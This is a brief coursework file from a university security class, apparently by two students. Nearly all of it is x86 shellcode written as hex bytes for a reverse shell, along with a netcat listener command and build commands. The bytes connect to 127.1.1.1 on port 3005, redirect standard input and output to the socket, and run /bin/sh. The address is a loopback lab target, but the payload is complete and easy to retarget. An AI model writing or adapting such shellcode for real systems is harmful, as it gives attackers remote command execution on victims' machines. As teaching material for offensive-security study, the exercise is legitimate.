# NOM / Prénom : NEHME Ali - MEZANI Nazim
# REVERSE SHELL ASM
# M1 - Sécurité - GR3
# ESGI
#

# nc -l -p 3005 -s 127.1.1.1
# nasm -f elf32 reverseShell.s && ld -m elf_i386 reverseShell.o && strace ./a.out

68 7f 01 01 01
66 68 0b bd

29 c0
66 68 67 01
58
    
50
5b
6a 02
5b

31 c9
6a 01
59

31 D2
cd 80
89 C3

66 B8 6a 01
89 E1
B2 10
cd 80

50
68 6e 2f 73 68
68 2f 2f 62 69

04 03
89 C1

B0 3f
49
cd 80
75 f9

89 C8
b2 0b
92

89 e3
cd 80